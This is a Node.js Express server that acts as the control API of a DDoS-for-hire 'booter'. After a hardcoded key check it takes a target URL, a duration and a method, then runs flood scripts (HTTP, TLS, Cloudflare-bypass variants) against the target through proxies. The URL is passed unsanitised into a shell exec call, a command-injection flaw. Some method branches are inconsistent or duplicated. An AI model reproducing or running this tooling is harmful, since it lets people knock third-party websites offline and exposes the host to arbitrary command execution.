const express = require('express');
const app = express();
const port = 3000;
var exec = require('child_process').exec

app.get('/', (req, res) => {
  const key = req.query.key;  
  const url = req.query.url;
  const time = req.query.time;
  const method = req.query.method;
if (!key || !url || !time || !method) {
    const err_u = {
        message: `sai url`,
        code: '400'
    }
    res.status(400).send(err_u);
  } else {
  if (key === '1234') {
    if (url) {
            if (time <= 60) {
                if (method === 'HTTP' ||method === 'TLS' ||method === 'FLOOD' ||method === 'CF-TLS'||method === 'HTTP-RAW' ||method === 'HTTP-LOAD') {
                    const jsonData = {
                        message: `attack sent`,
                        url: `${url}`,
                        time: `${time}`,
                        method: `${method}`,
                        code: '200'
                    };
                    res.status(200).send(jsonData);
                    if (method === 'HTTP') {
                        exec(`node 1.js ${url} ${time} 80 20 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http is running');
                    });
                    }
                    if (method === 'BROWSER') {
                        exec(`node browser.js ${url} ${time} 80 proxy.txt 20 2`, (error, stdout, stderr) => {  
                        console.log('http-raw is running');
                    });
                    }
                    if (method === 'TLS') {
                        exec(`node TLSvip.js ${url} ${time} 150 100 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('tls is running');
                    });
                    }
                    if (method === 'FLOOD') {
                        exec(`node floodbypass.js ${url} ${time} 200 150 proxy.txt flood`, (error, stdout, stderr) => {  
                        console.log('tlsbypass is running');
                    });
                    }
                    if (method === 'CF-TLS') {
                        exec(`node TLSCF.js ${url} ${time} 200 100 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http is running');
                    });
                    }
                    if (method === 'HTTP') {
                        exec(`node 404.js ${url} ${time} 200 100 proxy.txt`, (error, stdout, stderr) => {  
                        console.log('http-load is running');
                    });
                    }
                } else {
                    const err_method = {
                        message: `sai method`,
                        code: '400'
                    }
                    res.status(400).send(err_method);
                }
            } else {
                const err_time = {
                    message: `time phải dưới 60s`,
                    code: '400'
                }
                res.status(400).send(err_time);
            }
    } else {
        const err_url = {
            message: `coi lại url thiếu`,
            code: '400'
        }
        res.status(400).send(err_url);
    }
  } else {
    const err_key = {
        message: `sai key`,
        code: '400'
    }
    res.status(400).send(err_key);
  }
}
});

app.listen(port, () => {
  console.log(`server run on port http://localhost/:${port}`);
});
